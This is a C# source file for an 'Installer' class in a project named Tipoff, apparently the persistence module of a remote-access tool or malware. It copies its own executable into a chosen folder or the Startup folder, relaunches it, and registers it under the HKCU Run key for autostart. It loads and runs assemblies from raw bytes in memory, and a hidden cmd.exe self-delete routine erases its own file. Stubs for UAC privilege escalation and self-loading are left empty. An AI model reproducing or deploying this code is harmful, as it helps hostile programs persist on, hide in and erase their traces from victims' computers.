using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tipoff
{
    internal class Installer
    {
        public string[] m_args { get; set; }

        public bool m_bCopyDir { get; set; }
        public bool m_bStartUp { get; set; }
        public bool m_bReg { get; set; }
        public bool m_bUAC { get; set; }
        public bool m_bLoadToMemory { get; set; }

        public string m_szCurrentPath { get; set; }
        public string m_szCopyPath { get; set; }
        public string m_szStartUpName { get; set; }

        public string m_szRegKeyName { get; set; }

        private RegistryKey reg_key;

        public Installer()
        {
            reg_key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }

        /// <summary>
        /// Start installer.
        /// </summary>
        public void Start()
        {
            Copy();
            
            if (m_bReg)
            {
                RegRun();
            }
        }

        /// <summary>
        /// Copy to specified directory.
        /// </summary>
        private void Copy()
        {
            if (m_bCopyDir)
            {
                if (!File.Exists(m_szCopyPath))
                {
                    File.Copy(m_szCurrentPath, m_szCopyPath, true);
                    new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            FileName = m_szCopyPath,
                        }
                    }.Start();

                    Environment.Exit(0);
                }
            }
            if (m_bStartUp)
            {
                if (!File.Exists(m_szStartUpName))
                {
                    File.Copy(m_szCurrentPath, m_szStartUpName, true);
                    Process.Start(m_szStartUpName);

                    Environment.Exit(0);
                }
            }
        }

        /// <summary>
        /// Registry install.
        /// </summary>
        private void RegRun()
        {
            reg_key.SetValue(m_szRegKeyName, m_szCurrentPath);
        }

        public void RegRemove()
        {
            reg_key.DeleteValue(m_szRegKeyName);
        }

        /// <summary>
        /// UAC priviledge escalation.
        /// </summary>
        public void UAC()
        {
            
        }

        /// <summary>
        /// Memory shell
        /// </summary>
        public void fnLoadToMemory(string[] alpArgs, byte[] abExeBytes)
        {
            Assembly loaded = Assembly.Load(abExeBytes);
            MethodInfo entry = loaded.EntryPoint;
            object instance = null;
            if (!entry.IsStatic)
                instance = loaded.CreateInstance(entry.Name);

            entry.Invoke(instance, new object[] { alpArgs });
        }

        public void fnLoadItselfIntoMemory()
        {
            byte[] abData = File.ReadAllBytes(Application.StartupPath);

        }

        public void fnSelfDestroy(string szPath)
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = $"/C choice /C Y /N /D Y /T 5 & Del \"{Application.StartupPath}\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe",
            });

            Process.GetCurrentProcess().Kill();
        }
    }
}
